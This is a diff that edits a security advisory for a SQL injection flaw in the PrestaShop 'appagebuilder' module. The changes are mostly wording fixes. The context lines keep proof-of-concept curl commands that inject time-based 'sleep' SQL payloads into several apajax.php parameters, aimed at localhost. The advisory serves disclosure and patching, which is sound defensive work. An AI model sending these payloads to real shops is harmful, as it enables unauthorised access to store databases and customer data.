@@ -52,24 +52,24 @@ Be aware that version from 2.0.0 2.3.x+ (exact release is not determined) own an
 
 ## Proof of concept
 
-Based on this [POC](https://packetstormsecurity.com/files/168148/PrestaShop-Ap-Pagebuilder-2.4.4-SQL-Injection.html)
+Initial [POC](https://packetstormsecurity.com/files/168148/PrestaShop-Ap-Pagebuilder-2.4.4-SQL-Injection.html)
 
 ```bash
 curl -v 'https://localhost/modules/appagebuilder/apajax.php?rand=1641313272327&leoajax=1&product_all_one_img=1)+or+sleep(4)%23&image_product=0&wishlist_compare=1'
 curl -v 'hhttp://localhost/modules/appagebuilder/apajax.php?rand=1641313272327&leoajax=1&product_all_one_img=1&image_product=1)+or+sleep(4)%23&wishlist_compare=1'
 ```
 
-New POCds
+New POCs
 
 ```bash 
 curl -v 'https://localhost/modules/appagebuilder/apajax.php?leoajax=1&product_manufacture=1,1)+or+sleep(4)%23--'
 ```
 
-The POC which bypass WAF are not supplied.
+POC which bypass WAF is not supplied.
 
 ## Patch
 
-Disclamer: These patches are based on available known versions installed on some PrestaShop. 
+Disclamer: These patches are based on available known versions installed on PrestaShop. 
 This advisory try to do its best to be useful for everyone who want to fix critical vulnerabilities.
 
 ### Release 2.4.5
@@ -248,7 +248,6 @@ This advisory try to do its best to be useful for everyone who want to fix criti
          $order = ' ORDER BY i.`id_product`,`position`';
          $limit = ' LIMIT 0,1';
          //get product info
-
 ```
 
 ### 1.0.0 
@@ -381,7 +380,7 @@ This advisory try to do its best to be useful for everyone who want to fix criti
 
 ## Other recommandations
 
-We highly recommand to remove from your server this module if it's used, or upgrade to the lastest release of the module **appagebuilder** up to 2.4.5 and apply all fixes mentionned above.
+We highly recommand to remove from your server this module if not used, or upgrade to the lastest release of the module **appagebuilder** up to 2.4.5 and apply all fixes mentionned above.
 
 
 ## Links
